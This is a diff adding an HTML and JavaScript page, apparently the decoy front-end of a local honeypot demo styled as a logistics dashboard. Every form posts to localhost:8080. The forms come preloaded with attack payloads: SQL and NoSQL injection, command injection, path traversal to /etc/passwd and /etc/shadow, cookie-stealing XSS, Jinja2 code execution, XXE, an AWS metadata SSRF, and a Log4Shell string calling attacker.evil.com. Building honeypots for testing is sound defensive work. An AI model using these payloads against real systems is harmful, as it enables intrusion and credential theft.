@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SwiftLogix — Global Logistics Platform</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0f172a;
+      --bg2: #1e293b;
+      --bg3: #334155;
+      --border: #475569;
+      --primary: #3b82f6;
+      --primary-glow: rgba(59,130,246,0.3);
+      --accent: #10b981;
+      --orange: #f59e0b;
+      --red: #ef4444;
+      --text: #f1f5f9;
+      --muted: #94a3b8;
+      --font: 'Inter', -apple-system, sans-serif;
+      --radius: 12px;
+    }
+    body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; }
+
+    /* HEADER */
+    .topbar { display:flex; align-items:center; justify-content:space-between; padding:0.75rem 2rem;
+      background: rgba(15,23,42,0.95); border-bottom:1px solid rgba(71,85,105,0.4);
+      backdrop-filter:blur(20px); position:sticky; top:0; z-index:100; }
+    .brand { display:flex; align-items:center; gap:0.75rem; }
+    .brand-icon { width:36px; height:36px; background:linear-gradient(135deg,#3b82f6,#10b981);
+      border-radius:10px; display:flex; align-items:center; justify-content:center;
+      font-size:1.1rem; font-weight:800; color:#fff; box-shadow:0 4px 15px var(--primary-glow); }
+    .brand-name { font-size:1.15rem; font-weight:700; letter-spacing:-0.02em; }
+    .brand-name span { color:var(--accent); }
+    .topbar-right { display:flex; align-items:center; gap:1.25rem; }
+    .topbar-link { color:var(--muted); font-size:0.82rem; font-weight:500; text-decoration:none;
+      padding:0.4rem 0.75rem; border-radius:6px; transition:all 0.2s; cursor:pointer; }
+    .topbar-link:hover { color:var(--text); background:rgba(255,255,255,0.05); }
+    .user-avatar { width:32px; height:32px; border-radius:50%; background:var(--bg3);
+      display:flex; align-items:center; justify-content:center; font-size:0.75rem;
+      font-weight:600; border:2px solid var(--primary); cursor:pointer; }
+
+    /* LAYOUT */
+    .page { display:flex; min-height:calc(100vh - 52px); }
+    .sidebar { width:220px; background:rgba(30,41,59,0.6); border-right:1px solid rgba(71,85,105,0.3);
+      padding:1.25rem 0; flex-shrink:0; }
+    .sidebar-section { padding:0 0.75rem; margin-bottom:1.5rem; }
+    .sidebar-label { font-size:0.65rem; text-transform:uppercase; letter-spacing:0.12em;
+      color:var(--muted); padding:0 0.75rem; margin-bottom:0.5rem; font-weight:600; }
+    .sidebar-item { display:flex; align-items:center; gap:0.6rem; padding:0.55rem 0.75rem;
+      border-radius:8px; font-size:0.82rem; color:var(--muted); cursor:pointer;
+      transition:all 0.2s; font-weight:500; }
+    .sidebar-item:hover { background:rgba(255,255,255,0.05); color:var(--text); }
+    .sidebar-item.active { background:rgba(59,130,246,0.12); color:var(--primary); font-weight:600; }
+    .sidebar-item .icon { font-size:1rem; width:20px; text-align:center; }
+    .main { flex:1; padding:1.5rem 2rem; overflow-y:auto; }
+
+    /* CARDS */
+    .card { background:var(--bg2); border:1px solid rgba(71,85,105,0.35); border-radius:var(--radius);
+      overflow:hidden; transition:border-color 0.3s; }
+    .card:hover { border-color:rgba(71,85,105,0.6); }
+    .card-head { padding:1rem 1.25rem; border-bottom:1px solid rgba(71,85,105,0.25);
+      font-size:0.85rem; font-weight:600; display:flex; align-items:center;
+      justify-content:space-between; background:rgba(0,0,0,0.15); }
+    .card-body { padding:1.25rem; }
+
+    /* STAT ROW */
+    .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:1rem; margin-bottom:1.75rem; }
+    .stat { padding:1.1rem 1.25rem; position:relative; }
+    .stat-label { font-size:0.7rem; color:var(--muted); text-transform:uppercase;
+      letter-spacing:0.08em; font-weight:600; margin-bottom:0.35rem; }
+    .stat-val { font-size:1.75rem; font-weight:700; letter-spacing:-0.03em; }
+    .stat-icon { position:absolute; top:1rem; right:1rem; font-size:1.3rem; opacity:0.15; }
+    .stat-sub { font-size:0.7rem; color:var(--accent); margin-top:0.25rem; font-weight:500; }
+
+    /* GRID */
+    .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:1.25rem; margin-bottom:1.5rem; }
+    .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:1.25rem; margin-bottom:1.5rem; }
+    .full { grid-column:1/-1; }
+
+    /* FORM */
+    label { font-size:0.75rem; color:var(--muted); font-weight:600; display:block;
+      margin-bottom:0.35rem; text-transform:uppercase; letter-spacing:0.05em; }
+    input, textarea, select { width:100%; padding:0.6rem 0.85rem; background:rgba(0,0,0,0.3);
+      border:1px solid var(--border); border-radius:8px; color:var(--text);
+      font-family:var(--font); font-size:0.85rem; outline:none; transition:border-color 0.2s; }
+    input:focus, textarea:focus { border-color:var(--primary); box-shadow:0 0 0 3px var(--primary-glow); }
+    textarea { resize:vertical; min-height:80px; font-family:'Courier New',monospace; font-size:0.78rem; }
+    .btn { padding:0.55rem 1.25rem; border:none; border-radius:8px; font-family:var(--font);
+      font-size:0.8rem; font-weight:600; cursor:pointer; transition:all 0.2s;
+      display:inline-flex; align-items:center; gap:0.4rem; }
+    .btn-primary { background:var(--primary); color:#fff; }
+    .btn-primary:hover { background:#2563eb; box-shadow:0 4px 15px var(--primary-glow); transform:translateY(-1px); }
+    .btn-sm { padding:0.4rem 0.85rem; font-size:0.75rem; }
+    .btn-outline { background:transparent; border:1px solid var(--border); color:var(--muted); }
+    .btn-outline:hover { border-color:var(--primary); color:var(--primary); }
+    .btn-danger { background:rgba(239,68,68,0.15); color:var(--red); border:1px solid rgba(239,68,68,0.3); }
+    .btn-danger:hover { background:rgba(239,68,68,0.25); }
+
+    /* RESPONSE PANEL */
+    .response-panel { margin-top:1rem; background:rgba(0,0,0,0.35); border:1px solid rgba(71,85,105,0.3);
+      border-radius:8px; overflow:hidden; display:none; }
+    .response-panel.show { display:block; animation:slideIn 0.3s ease; }
+    .response-header { padding:0.6rem 1rem; background:rgba(0,0,0,0.3); font-size:0.72rem;
+      font-weight:600; display:flex; justify-content:space-between; align-items:center;
+      border-bottom:1px solid rgba(71,85,105,0.25); }
+    .response-body { padding:1rem; font-family:'Courier New',monospace; font-size:0.78rem;
+      color:#a5f3fc; white-space:pre-wrap; word-break:break-all; max-height:250px; overflow-y:auto; line-height:1.5; }
+    .resp-status { padding:0.15rem 0.5rem; border-radius:4px; font-size:0.68rem; font-weight:700; }
+    .resp-ok { background:rgba(16,185,129,0.2); color:var(--accent); }
+    .resp-err { background:rgba(239,68,68,0.2); color:var(--red); }
+
+    /* TABLE */
+    .tbl { width:100%; border-collapse:collapse; font-size:0.8rem; }
+    .tbl th { text-align:left; padding:0.65rem 0.85rem; font-size:0.68rem; text-transform:uppercase;
+      letter-spacing:0.08em; color:var(--muted); font-weight:600;
+      border-bottom:1px solid rgba(71,85,105,0.3); }
+    .tbl td { padding:0.6rem 0.85rem; border-bottom:1px solid rgba(71,85,105,0.15); }
+    .tbl tr:hover td { background:rgba(255,255,255,0.02); }
+    .badge { padding:0.15rem 0.55rem; border-radius:4px; font-size:0.68rem; font-weight:600; }
+    .badge-green { background:rgba(16,185,129,0.15); color:var(--accent); }
+    .badge-yellow { background:rgba(245,158,11,0.15); color:var(--orange); }
+    .badge-blue { background:rgba(59,130,246,0.15); color:var(--primary); }
+
+    /* TABS */
+    .tabs { display:flex; gap:0.25rem; margin-bottom:1.25rem; border-bottom:1px solid rgba(71,85,105,0.3);
+      padding-bottom:0; }
+    .tab { padding:0.5rem 1rem; font-size:0.8rem; font-weight:500; color:var(--muted); cursor:pointer;
+      border-bottom:2px solid transparent; transition:all 0.2s; }
+    .tab:hover { color:var(--text); }
+    .tab.active { color:var(--primary); border-color:var(--primary); font-weight:600; }
+    .tab-content { display:none; }
+    .tab-content.active { display:block; animation:fadeIn 0.3s ease; }
+
+    @keyframes fadeIn { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+    @keyframes slideIn { from{opacity:0;max-height:0} to{opacity:1;max-height:400px} }
+
+    /* TOAST */
+    .toast-container { position:fixed; top:60px; right:20px; z-index:1000; display:flex; flex-direction:column; gap:0.5rem; }
+    .toast { padding:0.75rem 1.25rem; border-radius:10px; font-size:0.8rem; font-weight:500;
+      backdrop-filter:blur(20px); border:1px solid rgba(71,85,105,0.4); animation:slideIn 0.3s ease;
+      box-shadow:0 8px 30px rgba(0,0,0,0.4); display:flex; align-items:center; gap:0.5rem; }
+    .toast-info { background:rgba(59,130,246,0.15); color:#93c5fd; border-color:rgba(59,130,246,0.3); }
+    .toast-success { background:rgba(16,185,129,0.15); color:#6ee7b7; border-color:rgba(16,185,129,0.3); }
+
+    @media(max-width:900px) {
+      .sidebar { display:none; }
+      .stats { grid-template-columns:1fr 1fr; }
+      .grid-2, .grid-3 { grid-template-columns:1fr; }
+    }
+
+    /* Honeypot link bar */
+    .honeypot-bar { background:rgba(59,130,246,0.08); border:1px solid rgba(59,130,246,0.2);
+      border-radius:8px; padding:0.5rem 1rem; margin-bottom:1.25rem; display:flex;
+      align-items:center; justify-content:space-between; font-size:0.78rem; }
+    .honeypot-bar a { color:var(--primary); text-decoration:none; font-weight:600; }
+    .honeypot-bar a:hover { text-decoration:underline; }
+  </style>
+</head>
+<body>
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="brand">
+    <div class="brand-icon">S</div>
+    <div class="brand-name">Swift<span>Logix</span></div>
+  </div>
+  <div class="topbar-right">
+    <span class="topbar-link">Dashboard</span>
+    <span class="topbar-link">Shipments</span>
+    <span class="topbar-link">Reports</span>
+    <div class="user-avatar">AK</div>
+  </div>
+</div>
+
+<div class="toast-container" id="toast-container"></div>
+
+<div class="page">
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Operations</div>
+      <div class="sidebar-item active" onclick="showTab('overview')"><span class="icon">📊</span> Overview</div>
+      <div class="sidebar-item" onclick="showTab('tracking')"><span class="icon">🔍</span> Track Shipment</div>
+      <div class="sidebar-item" onclick="showTab('import')"><span class="icon">📦</span> Import Orders</div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">System</div>
+      <div class="sidebar-item" onclick="showTab('users')"><span class="icon">👤</span> User Management</div>
+      <div class="sidebar-item" onclick="showTab('integrations')"><span class="icon">🔗</span> Integrations</div>
+      <div class="sidebar-item" onclick="showTab('settings')"><span class="icon">⚙️</span> Settings</div>
+    </div>
+    <div class="sidebar-section" style="margin-top:auto; padding-top:1.5rem; border-top:1px solid rgba(71,85,105,0.2);">
+      <div class="sidebar-label">Honeypot</div>
+      <div class="sidebar-item" onclick="window.open('http://localhost:3000','_blank')"><span class="icon">🛡️</span> CyberShield Monitor</div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="main">
+    <div class="honeypot-bar">
+      <span>🛡️ This logistics dashboard is the <strong>honeypot front-end</strong> — all inputs are sent to <code>localhost:8080</code></span>
+      <a href="http://localhost:3000" target="_blank">Open CyberShield Monitor →</a>
+    </div>
+
+    <!-- ============ TAB: OVERVIEW ============ -->
+    <div class="tab-content active" id="tab-overview">
+      <div class="stats">
+        <div class="stat card"><div class="stat-label">Active Shipments</div><div class="stat-val" style="color:var(--primary)">1,284</div><div class="stat-sub">↑ 12% this week</div><div class="stat-icon">📦</div></div>
+        <div class="stat card"><div class="stat-label">Delivered Today</div><div class="stat-val" style="color:var(--accent)">347</div><div class="stat-sub">98.2% on time</div><div class="stat-icon">✅</div></div>
+        <div class="stat card"><div class="stat-label">Pending Review</div><div class="stat-val" style="color:var(--orange)">23</div><div class="stat-sub">5 flagged</div><div class="stat-icon">⏳</div></div>
+        <div class="stat card"><div class="stat-label">Warehouses</div><div class="stat-val" style="color:var(--muted)">12</div><div class="stat-sub">All operational</div><div class="stat-icon">🏭</div></div>
+      </div>
+
+      <div class="grid-2">
+        <!-- SEARCH — SQLi target -->
+        <div class="card">
+          <div class="card-head">🔍 Search Shipments <span class="badge badge-blue">SQLi Target</span></div>
+          <div class="card-body">
+            <label>Search by tracking ID, destination, or product</label>
+            <div style="display:flex;gap:0.5rem;margin-bottom:0.5rem;">
+              <input type="text" id="search-input" placeholder="e.g. laptop' OR 1=1-- OR price/**/UNION/**/SELECT...">
+              <button class="btn btn-primary" onclick="doSearch()">Search</button>
+            </div>
+            <div style="font-size:0.68rem;color:var(--muted);">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('search-input','laptop\\'  OR 1=1-- ',doSearch)">SQLi classic</code> · <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('search-input','{\"query\":\"laptop\",\"filter\":\"price/**/UNI0N/**/SELE CT/**/1,2,table_name/**/FR0M/**/inf0rmation_schema.tables\"}',doSearch)">Obfuscated SQLi</code></div>
+            <div class="response-panel" id="resp-search"></div>
+          </div>
+        </div>
+
+        <!-- LOGIN — NoSQL / Auth target -->
+        <div class="card">
+          <div class="card-head">🔐 Staff Login <span class="badge badge-yellow">Auth Target</span></div>
+          <div class="card-body">
+            <label>Username</label>
+            <input type="text" id="login-user" placeholder='admin  OR  {"$ne": ""}' style="margin-bottom:0.6rem;">
+            <label>Password</label>
+            <input type="password" id="login-pass" placeholder='password  OR  {"$gt": ""}' style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doLogin()" style="width:100%;">Sign In</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="document.getElementById('login-user').value='{\"$ne\":\"\"}';document.getElementById('login-pass').value='{\"$gt\":\"\"}';doLogin()">NoSQL Inject</code> · <code style="cursor:pointer;color:var(--primary)" onclick="document.getElementById('login-user').value='admin';document.getElementById('login-pass').value='password';doLogin()">Credential Stuff</code></div>
+            <div class="response-panel" id="resp-login"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- RECENT SHIPMENTS TABLE -->
+      <div class="card" style="margin-bottom:1.5rem;">
+        <div class="card-head">📋 Recent Shipments</div>
+        <div class="card-body" style="padding:0;">
+          <table class="tbl">
+            <thead><tr><th>Tracking ID</th><th>Origin</th><th>Destination</th><th>Status</th><th>ETA</th></tr></thead>
+            <tbody>
+              <tr><td style="color:var(--primary);font-weight:600">SLX-20260401-8827</td><td>Mumbai, IN</td><td>New York, US</td><td><span class="badge badge-green">In Transit</span></td><td>Apr 28</td></tr>
+              <tr><td style="color:var(--primary);font-weight:600">SLX-20260401-6612</td><td>Shanghai, CN</td><td>London, UK</td><td><span class="badge badge-yellow">Customs</span></td><td>Apr 30</td></tr>
+              <tr><td style="color:var(--primary);font-weight:600">SLX-20260331-4491</td><td>São Paulo, BR</td><td>Tokyo, JP</td><td><span class="badge badge-green">Delivered</span></td><td>Apr 22</td></tr>
+              <tr><td style="color:var(--primary);font-weight:600">SLX-20260330-2205</td><td>Dubai, AE</td><td>Sydney, AU</td><td><span class="badge badge-blue">Processing</span></td><td>May 02</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ TAB: TRACKING ============ -->
+    <div class="tab-content" id="tab-tracking">
+      <div class="grid-2">
+        <!-- Path Traversal target -->
+        <div class="card">
+          <div class="card-head">📄 View Shipping Document <span class="badge badge-yellow">Path Traversal</span></div>
+          <div class="card-body">
+            <label>Document Path / File Name</label>
+            <input type="text" id="file-input" placeholder="e.g. /invoices/2024/invoice-001.pdf" style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doFileView()">Fetch Document</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('file-input','../../../../../../etc/passwd',doFileView)">Path Traversal</code> · <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('file-input','/proc/self/environ',doFileView)">Proc Read</code></div>
+            <div class="response-panel" id="resp-file"></div>
+          </div>
+        </div>
+
+        <!-- Command Injection target -->
+        <div class="card">
+          <div class="card-head">🖥️ System Diagnostics <span class="badge badge-yellow">Cmd Injection</span></div>
+          <div class="card-body">
+            <label>Run network diagnostic (ping / traceroute)</label>
+            <input type="text" id="cmd-input" placeholder="e.g. 8.8.8.8; whoami" style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doCmd()">Run Diagnostic</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('cmd-input','8.8.8.8; cat /etc/passwd',doCmd)">Cmd Inject</code> · <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('cmd-input','8.8.8.8 && whoami && id',doCmd)">Chain Cmds</code></div>
+            <div class="response-panel" id="resp-cmd"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <!-- XSS target -->
+        <div class="card">
+          <div class="card-head">💬 Delivery Feedback <span class="badge badge-yellow">XSS Target</span></div>
+          <div class="card-body">
+            <label>Leave feedback for shipment</label>
+            <textarea id="xss-input" placeholder='Great service! OR <script>alert("XSS")</script>'></textarea>
+            <button class="btn btn-primary" onclick="doFeedback()" style="margin-top:0.5rem;">Submit Feedback</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('xss-input','<script>alert(document.cookie)</script>',doFeedback)">XSS script</code> · <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('xss-input','<img src=x onerror=alert(1)>',doFeedback)">XSS img</code></div>
+            <div class="response-panel" id="resp-xss"></div>
+          </div>
+        </div>
+
+        <!-- SSTI target -->
+        <div class="card">
+          <div class="card-head">👤 Update Profile <span class="badge badge-blue">SSTI Target</span></div>
+          <div class="card-body">
+            <label>Display Name</label>
+            <input type="text" id="ssti-input" placeholder='Your name OR {{7*7}} OR {{config.__class__...}}' style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doProfile()">Update Profile</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('ssti-input','{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}',doProfile)">SSTI Jinja2</code></div>
+            <div class="response-panel" id="resp-ssti"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ TAB: IMPORT ============ -->
+    <div class="tab-content" id="tab-import">
+      <div class="grid-2">
+        <!-- XXE target -->
+        <div class="card">
+          <div class="card-head">📄 Import XML Orders <span class="badge badge-yellow">XXE Target</span></div>
+          <div class="card-body">
+            <label>Paste XML order data</label>
+            <textarea id="xxe-input" rows="6" placeholder='<?xml version="1.0"?>
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<order><item>&xxe;</item></order>'></textarea>
+            <button class="btn btn-primary" onclick="doXML()" style="margin-top:0.5rem;">Import Orders</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('xxe-input','<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><order><item>&xxe;</item><quantity>1</quantity></order>',doXML)">XXE File Read</code></div>
+            <div class="response-panel" id="resp-xxe"></div>
+          </div>
+        </div>
+
+        <!-- SSRF -->
+        <div class="card">
+          <div class="card-head">🔗 Validate Webhook URL <span class="badge badge-blue">SSRF Target</span></div>
+          <div class="card-body">
+            <label>Webhook Endpoint URL</label>
+            <input type="text" id="ssrf-input" placeholder="https://your-server.com/webhook OR http://169.254.169.254/..." style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doWebhook()">Validate URL</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('ssrf-input','http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role',doWebhook)">AWS SSRF</code></div>
+            <div class="response-panel" id="resp-ssrf"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ TAB: USERS ============ -->
+    <div class="tab-content" id="tab-users">
+      <div class="grid-2">
+        <!-- IDOR target -->
+        <div class="card">
+          <div class="card-head">👤 Lookup User Profile <span class="badge badge-yellow">IDOR Target</span></div>
+          <div class="card-body">
+            <label>User ID</label>
+            <input type="text" id="idor-input" placeholder="e.g. 1" style="margin-bottom:0.5rem;">
+            <label>Include Fields (comma-separated)</label>
+            <input type="text" id="idor-fields" placeholder="e.g. ssn,credit_card,bank_account" style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doIDOR()">Lookup User</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="document.getElementById('idor-input').value='1';document.getElementById('idor-fields').value='ssn,credit_card,bank_account';doIDOR()">IDOR + PII</code></div>
+            <div class="response-panel" id="resp-idor"></div>
+          </div>
+        </div>
+
+        <!-- Dir Enum -->
+        <div class="card">
+          <div class="card-head">📂 Browse Resources <span class="badge badge-yellow">Dir Enum</span></div>
+          <div class="card-body">
+            <label>Resource Path</label>
+            <input type="text" id="enum-input" placeholder="e.g. /admin  OR  /.env  OR  /.git" style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doEnum()">Browse</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('enum-input','/.env',doEnum)">.env</code> · <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('enum-input','/.git/config',doEnum)">.git</code> · <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('enum-input','/wp-admin',doEnum)">wp-admin</code> · <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('enum-input','/server-status',doEnum)">server-status</code></div>
+            <div class="response-panel" id="resp-enum"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ TAB: INTEGRATIONS ============ -->
+    <div class="tab-content" id="tab-integrations">
+      <div class="grid-2">
+        <!-- Log4Shell / JNDI -->
+        <div class="card">
+          <div class="card-head">☕ Java API Health Check <span class="badge badge-blue">Log4Shell</span></div>
+          <div class="card-body">
+            <label>API Version Header</label>
+            <input type="text" id="jndi-input" placeholder='2.1  OR  ${jndi:ldap://attacker.com/exploit}' style="margin-bottom:0.75rem;">
+            <button class="btn btn-primary" onclick="doJNDI()">Check Health</button>
+            <div style="font-size:0.68rem;color:var(--muted);margin-top:0.5rem;">Try: <code style="cursor:pointer;color:var(--primary)" onclick="fillAndRun('jndi-input','${jndi:ldap://attacker.evil.com:1389/Exploit}',doJNDI)">Log4Shell</code></div>
+            <div class="response-panel" id="resp-jndi"></div>
+          </div>
+        </div>
+
+        <!-- Custom Request -->
+        <div class="card">
+          <div class="card-head">🛠️ Custom API Request <span class="badge badge-blue">Free-form</span></div>
+          <div class="card-body">
+            <div style="display:flex;gap:0.5rem;margin-bottom:0.6rem;">
+              <select id="custom-method" style="width:100px;"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option></select>
+              <input type="text" id="custom-endpoint" placeholder="/api/v2/any-endpoint">
+            </div>
+            <label>Request Body (JSON)</label>
+            <textarea id="custom-body" placeholder='{"key": "value"}'></textarea>
+            <button class="btn btn-primary" onclick="doCustom()" style="margin-top:0.5rem;">Send Request</button>
+            <div class="response-panel" id="resp-custom"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ TAB: SETTINGS ============ -->
+    <div class="tab-content" id="tab-settings">
+      <div class="card" style="max-width:600px;">
+        <div class="card-head">⚙️ System Configuration</div>
+        <div class="card-body">
+          <p style="color:var(--muted);font-size:0.85rem;margin-bottom:1rem;">Access system configuration files and environment settings.</p>
+          <div style="display:flex;gap:0.5rem;flex-wrap:wrap;">
+            <button class="btn btn-outline" onclick="fillAndRun('enum-input','/.env',doEnum);showTab('users')">View .env</button>
+            <button class="btn btn-outline" onclick="fillAndRun('enum-input','/config.json',doEnum);showTab('users')">View config.json</button>
+            <button class="btn btn-outline" onclick="fillAndRun('enum-input','/server-status',doEnum);showTab('users')">Server Status</button>
+            <button class="btn btn-danger" onclick="fillAndRun('file-input','../../../../../../etc/shadow',doFileView);showTab('tracking')">Access /etc/shadow</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const HONEYPOT = 'http://localhost:8080';
+
+// ── Tab navigation ─────────────────────────────────────────
+function showTab(name) {
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.sidebar-item').forEach(s => s.classList.remove('active'));
+  const tab = document.getElementById('tab-' + name);
+  if (tab) tab.classList.add('active');
+  event?.target?.classList?.add('active');
+}
+
+// ── Toast notifications ────────────────────────────────────
+function toast(msg, type='info') {
+  const c = document.getElementById('toast-container');
+  const t = document.createElement('div');
+  t.className = 'toast toast-' + type;
+  t.innerHTML = msg;
+  c.appendChild(t);
+  setTimeout(() => t.remove(), 4000);
+}
+
+// ── Helper: fill input and run ─────────────────────────────
+function fillAndRun(inputId, value, fn) {
+  const el = document.getElementById(inputId);
+  if (el.tagName === 'TEXTAREA') el.value = value;
+  else el.value = value;
+  fn();
+}
+
+// ── Show response panel ─────────────────────────────────────
+function showResponse(panelId, status, data) {
+  const panel = document.getElementById(panelId);
+  const isOk = status >= 200 && status < 400;
+  let bodyText;
+  try { bodyText = typeof data === 'string' ? data : JSON.stringify(JSON.parse(JSON.stringify(data)), null, 2); }
+  catch { bodyText = String(data); }
+  panel.innerHTML = `
+    <div class="response-header">
+      <span>Server Response</span>
+      <span class="resp-status ${isOk ? 'resp-ok' : 'resp-err'}">HTTP ${status}</span>
+    </div>
+    <div class="response-body">${escapeHtml(bodyText)}</div>`;
+  panel.classList.add('show');
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ── API call helper ─────────────────────────────────────────
+async function honeypotFetch(endpoint, opts = {}) {
+  try {
+    const url = HONEYPOT + endpoint;
+    toast(`📡 Sending → <code>${opts.method||'GET'} ${endpoint.substring(0,50)}</code>`, 'info');
+    const resp = await fetch(url, { ...opts, headers: { ...opts.headers } });
+    const text = await resp.text();
+    let data;
+    try { data = JSON.parse(text); } catch { data = text; }
+    toast(`✅ Response received — check CyberShield dashboard`, 'success');
+    return { status: resp.status, data };
+  } catch (e) {
+    return { status: 0, data: 'Connection failed: ' + e.message };
+  }
+}
+
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+//  ATTACK FUNCTIONS — each sends to honeypot port 8080
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+// 1. SQL Injection
+async function doSearch() {
+  const q = document.getElementById('search-input').value;
+  const r = await honeypotFetch('/api/v2/products/search', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ query: q, category: 'shipments', filter: q })
+  });
+  showResponse('resp-search', r.status, r.data);
+}
+
+// 2. NoSQL / Auth attacks
+async function doLogin() {
+  const user = document.getElementById('login-user').value;
+  const pass = document.getElementById('login-pass').value;
+  let userVal, passVal;
+  try { userVal = JSON.parse(user); } catch { userVal = user; }
+  try { passVal = JSON.parse(pass); } catch { passVal = pass; }
+  const r = await honeypotFetch('/api/v2/auth/login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: userVal, password: passVal, remember_me: true })
+  });
+  showResponse('resp-login', r.status, r.data);
+}
+
+// 3. Path Traversal
+async function doFileView() {
+  const f = document.getElementById('file-input').value;
+  const r = await honeypotFetch('/api/serve?file=' + encodeURIComponent(f));
+  showResponse('resp-file', r.status, r.data);
+}
+
+// 4. Command Injection
+async function doCmd() {
+  const c = document.getElementById('cmd-input').value;
+  const r = await honeypotFetch('/api/serve?cmd=' + encodeURIComponent(c));
+  showResponse('resp-cmd', r.status, r.data);
+}
+
+// 5. XSS
+async function doFeedback() {
+  const fb = document.getElementById('xss-input').value;
+  const r = await honeypotFetch('/api/feedback', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ feedback: fb, shipment_id: 'SLX-20260401-8827' })
+  });
+  showResponse('resp-xss', r.status, r.data);
+}
+
+// 6. SSTI
+async function doProfile() {
+  const name = document.getElementById('ssti-input').value;
+  const r = await honeypotFetch('/api/v2/profile/update', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ display_name: name, bio: 'Profile update' })
+  });
+  showResponse('resp-ssti', r.status, r.data);
+}
+
+// 7. XXE
+async function doXML() {
+  const xml = document.getElementById('xxe-input').value;
+  const r = await honeypotFetch('/api/v2/import/xml', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/xml' },
+    body: xml
+  });
+  showResponse('resp-xxe', r.status, r.data);
+}
+
+// 8. SSRF
+async function doWebhook() {
+  const url = document.getElementById('ssrf-input').value;
+  const r = await honeypotFetch('/api/v2/webhook/validate', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ webhook_url: url, events: ['order.completed', 'shipment.delivered'] })
+  });
+  showResponse('resp-ssrf', r.status, r.data);
+}
+
+// 9. IDOR
+async function doIDOR() {
+  const uid = document.getElementById('idor-input').value || '1';
